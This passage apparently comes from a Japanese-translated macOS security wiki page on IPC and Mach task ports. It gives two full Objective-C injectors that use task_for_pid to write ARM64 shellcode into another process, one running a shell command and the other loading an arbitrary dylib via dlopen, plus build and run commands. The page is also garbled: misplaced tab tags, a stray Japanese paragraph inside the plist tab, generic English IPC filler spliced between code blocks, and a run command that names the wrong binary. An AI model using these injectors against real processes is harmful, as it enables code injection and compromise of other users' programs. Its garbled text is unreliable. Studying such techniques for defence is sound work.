performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}次の手順は、IPC（プロセス間通信）を使用して権限昇格を行う方法を示しています。IPCは、macOSシステム内のプロセス間でデータをやり取りするためのメカニズムです。攻撃者は、IPCを悪用して権限を昇格させることができます。{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

前のプログラムを**コンパイル**し、同じユーザーでコードをインジェクトできるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

## macOS IPC (Inter-Process Communication)

### Overview

Inter-Process Communication (IPC) mechanisms on macOS can be abused by attackers to facilitate privilege escalation. Understanding how IPC works on macOS is crucial for identifying and exploiting potential security weaknesses.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
iOSでこれを動作させるには、書き込み可能なメモリを実行可能にするために、`dynamic-codesigning`の権限が必要です。
{% endhint %}

### タスクポートを介したスレッドへのDylibインジェクション

macOSでは、**スレッド**は**Mach**を介して操作されるか、**posix `pthread` api**を使用して操作される可能性があります。前のインジェクションで生成したスレッドはMach apiを使用して生成されたため、**posixに準拠していません**。

単純なシェルコードをインジェクトしてコマンドを実行することが可能でしたが、これは**posixに準拠する必要がなかった**ため、Machだけで動作しました。**より複雑なインジェクション**を行うには、スレッドが**posixにも準拠する必要があります**。

したがって、スレッドを**改善する**ためには、**`pthread_create_from_mach_thread`**を呼び出すべきです。これにより、**有効なpthreadが作成**されます。その後、この新しいpthreadは**dlopenを呼び出して**システムから**dylibをロード**することができます。つまり、異なるアクションを実行するための新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

例えば、（ログを生成してそれを聞くことができるものなど）**例のdylibs**を以下で見つけることができます：

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"リモートスレッドのコードのメモリアクセス権を設定できません: エラー %s\n", mach_error_string(kr));
return (-4);
}

// 割り当てられたスタックメモリの権限を設定する
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"リモートスレッドのスタックのメモリアクセス権を設定できません: エラー %s\n", mach_error_string(kr));
return (-4);
}


// シェルコードを実行するスレッドを作成する
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // これが実際のスタック
//remoteStack64 -= 8;  // 16のアライメントが必要

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("リモートスタック64  0x%llx, リモートコードは %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"リモートスレッドを作成できません: エラー %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "使用法: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: ディスク上の dylib へのパス\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib が見つかりません\n");
}

}
```
</details>  

### macOS IPC (Inter-Process Communication)

#### macOS IPC Overview

Inter-process communication (IPC) mechanisms are commonly used in macOS to allow communication between processes. Understanding how IPC works is crucial for both legitimate software development and security research. This section provides an overview of macOS IPC mechanisms and their potential security implications.

#### macOS IPC Mechanisms

macOS supports various IPC mechanisms, including:

- **Mach Messages**: Low-level IPC mechanism used by macOS for inter-process communication.
- **XPC Services**: High-level API for creating inter-process communication in macOS.
- **Distributed Objects**: Framework for distributed computing using Objective-C.
- **Apple Events**: Inter-application communication mechanism used in macOS.
- **Unix Domain Sockets**: Inter-process communication between processes on the same system.

#### macOS IPC Security Considerations

When analyzing macOS IPC mechanisms, it is essential to consider security implications such as:

- **Privilege Escalation**: Improperly implemented IPC mechanisms can be abused for privilege escalation attacks.
- **Data Integrity**: Ensuring data integrity and confidentiality during IPC communication.
- **Authentication**: Verifying the identity of communicating processes to prevent unauthorized access.
- **Denial of Service**: Protecting IPC mechanisms from denial of service attacks.

Understanding macOS IPC mechanisms and their security considerations is crucial for securing macOS systems against potential threats.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### タスクポート経由のスレッドハイジャッキング <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この技術では、プロセスのスレッドがハイジャックされます:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本情報

XPCは、macOSおよびiOSで使用されるカーネルであるXNUの間のプロセス間通信を意味するもので、**プロセス間の通信**のためのフレームワークです。 XPCは、システム上の異なるプロセス間で**安全で非同期のメソッド呼び出しを行うメカニズム**を提供します。これはAppleのセキュリティパラダイムの一部であり、**特権を分離したアプリケーション**の作成を可能にし、各**コンポーネント**がその仕事を行うために必要な権限のみで実行されるようにします。これにより、侵害されたプロセスからの潜在的な被害を制限します。

この**通信方法**や**脆弱性**についての詳細は、以下を参照してください:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIGは、Mach IPCのプロセスを**簡素化するために作成**されました。これは、RPCをプログラムするための多くの作業が同じアクション（引数のパッキング、メッセージの送信、サーバーでのデータのアンパッキングなど）を必要とするためです。

MIGは基本的に、サーバーとクライアントが指定された定義（IDL - Interface Definition Language - で）で通信するために必要なコードを**生成**します。生成されたコードが醜い場合でも、開発者はそれをインポートするだけで、以前よりもはるかにシンプルなコードになります。

詳細については、以下を確認してください:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 参考文献

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
